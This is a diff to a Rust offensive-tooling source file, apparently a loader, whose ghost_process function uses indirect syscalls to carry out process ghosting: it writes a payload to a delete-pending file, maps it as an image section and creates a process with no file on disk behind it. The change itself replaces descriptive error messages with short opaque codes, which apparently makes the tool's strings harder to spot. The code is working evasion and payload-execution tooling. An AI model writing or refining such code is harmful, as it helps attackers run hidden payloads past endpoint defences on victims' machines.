@@ -96,19 +96,19 @@ pub unsafe fn ghost_process(payload: &[u8]) -> Result<(), String> {
 
     // 1. Resolve all syscalls via Indirect Syscalls
     let sc_create_file = Syscall::resolve(syscalls::HASH_NT_CREATE_FILE)
-        .ok_or("[Ghost] Failed to resolve NtCreateFile")?;
+        .ok_or("[Ghost] E01")?;
     let sc_write_file = Syscall::resolve(syscalls::HASH_NT_WRITE_FILE)
-        .ok_or("[Ghost] Failed to resolve NtWriteFile")?;
+        .ok_or("[Ghost] E02")?;
     let sc_set_info = Syscall::resolve(syscalls::HASH_NT_SET_INFORMATION_FILE)
-        .ok_or("[Ghost] Failed to resolve NtSetInformationFile")?;
+        .ok_or("[Ghost] E03")?;
     let sc_close = Syscall::resolve(syscalls::HASH_NT_CLOSE)
-        .ok_or("[Ghost] Failed to resolve NtClose")?;
+        .ok_or("[Ghost] E04")?;
     let sc_create_section = Syscall::resolve(syscalls::HASH_NT_CREATE_SECTION)
-        .ok_or("[Ghost] Failed to resolve NtCreateSection")?;
+        .ok_or("[Ghost] E05")?;
     let sc_create_process = Syscall::resolve(syscalls::HASH_NT_CREATE_PROCESS_EX)
-        .ok_or("[Ghost] Failed to resolve NtCreateProcessEx")?;
+        .ok_or("[Ghost] E06")?;
     let sc_create_thread = Syscall::resolve(syscalls::HASH_NT_CREATE_THREAD_EX)
-        .ok_or("[Ghost] Failed to resolve NtCreateThreadEx")?;
+        .ok_or("[Ghost] E07")?;
 
     debug!("[Ghost] All syscalls resolved via Indirect Syscalls");
 
@@ -154,7 +154,7 @@ pub unsafe fn ghost_process(payload: &[u8]) -> Result<(), String> {
     ]);
 
     if status != 0 {
-        return Err(format!("[Ghost] NtCreateFile failed: 0x{:08X}", status));
+        return Err(format!("G01:{:X}", status));
     }
     info!("[Ghost] Phantom file created");
 
@@ -171,7 +171,7 @@ pub unsafe fn ghost_process(payload: &[u8]) -> Result<(), String> {
 
     if status != 0 {
         syscalls::syscall(&sc_close, &[h_file as usize]);
-        return Err(format!("[Ghost] NtSetInformationFile failed: 0x{:08X}", status));
+        return Err(format!("G02:{:X}", status));
     }
     debug!("[Ghost] File marked delete-pending");
 
@@ -190,7 +190,7 @@ pub unsafe fn ghost_process(payload: &[u8]) -> Result<(), String> {
 
     if status != 0 {
         syscalls::syscall(&sc_close, &[h_file as usize]);
-        return Err(format!("[Ghost] NtWriteFile failed: 0x{:08X}", status));
+        return Err(format!("G03:{:X}", status));
     }
     info!("[Ghost] Payload written to phantom file");
 
@@ -209,7 +209,7 @@ pub unsafe fn ghost_process(payload: &[u8]) -> Result<(), String> {
 
     if status != 0 {
         syscalls::syscall(&sc_close, &[h_file as usize]);
-        return Err(format!("[Ghost] NtCreateSection failed: 0x{:08X}", status));
+        return Err(format!("G04:{:X}", status));
     }
     info!("[Ghost] Image section created");
 
@@ -235,7 +235,7 @@ pub unsafe fn ghost_process(payload: &[u8]) -> Result<(), String> {
 
     if status != 0 {
         syscalls::syscall(&sc_close, &[h_section as usize]);
-        return Err(format!("[Ghost] NtCreateProcessEx failed: 0x{:08X}", status));
+        return Err(format!("G05:{:X}", status));
     }
     info!("[Ghost] Ghost process created (no file backing!)");
 
